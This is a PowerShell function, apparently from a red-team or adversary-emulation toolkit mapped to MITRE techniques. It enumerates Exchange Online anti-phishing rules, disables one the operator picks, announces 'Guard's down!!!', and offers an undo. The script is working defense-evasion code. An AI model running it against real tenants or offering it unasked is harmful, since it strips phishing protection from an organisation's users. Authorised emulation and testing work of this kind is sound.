function DisableAntiPhishing {

    mitre_details("DisableAntiPhishing")

    #List all AntiPhish Policy
    $inititate_recon = Read-Host -Prompt "Initiate recon to retrive all AntiPhishing policies (Yes/No)"
    
    if ($inititate_recon -notin "No","no","N","n"){
        Write-Host  "`nRecon: Finding all Anti-Phishing policies in the environment...`n"
        #Get-AntiPhishPolicy | Format-Table Name,Enabled,IsDefault
        Get-AntiPhishRule | Format-Table Name,State,Priority,Identity
    }

    else {
        #DoNothing
    }

    #Select a policy to modify
    $policy_name = Read-Host -Prompt "Enter the name of AntPhishing policy from the table to disable"

    #Disable AntiPhishing policy
    try {
        Write-Host "`nDisabling Anti-Phishing policy: '$policy_name'..."
        #Set-AntiPhishPolicy -Identity $policy_name -Enabled 0
        Disable-AntiPhishRule -Identity $policy_name -Confirm:$false -ErrorAction Stop
        Start-Sleep -s 5  
        #Get-AntiPhishPolicy -Identity $policy_name | Format-Table Name,Enabled,IsDefault
        Get-AntiPhishRule -Identity $policy_name | Format-Table Name,State,Priority
        Write-Host "Guard's down!!! Successfully disabled Anti-Phishing policy!!!" -ForegroundColor Yellow -BackgroundColor Black
        $allow_undo = $true
    }
    catch {
        Write-Host "Error: Failed to disable Anti-Phishing policy!"
    }
    
    #Undo changes
    if ($allow_undo -eq $true) {
        #Re-enble AntiPhishing Policy
        $user_choice = Read-Host -Prompt "`nWould you like to re-enable the Anti-Phishing policy? (yes/no)"

        if ($user_choice -notin "No","no","N","n") {
            try {
                Enable-AntiPhishRule -Identity $policy_name -Confirm:$false
                Start-Sleep -s 5 
                Get-AntiPhishRule -Identity $policy_name | Format-Table Name,State,Priority
                Write-Host "Undo successful: Re-enabled Anti-Phishing policy: '$policy_name'" -ForegroundColor Yellow -BackgroundColor Black
            }
            catch {
                Write-Host "Failed to undo changes" -ForegroundColor Red
            }
        }
    }
    Pause
}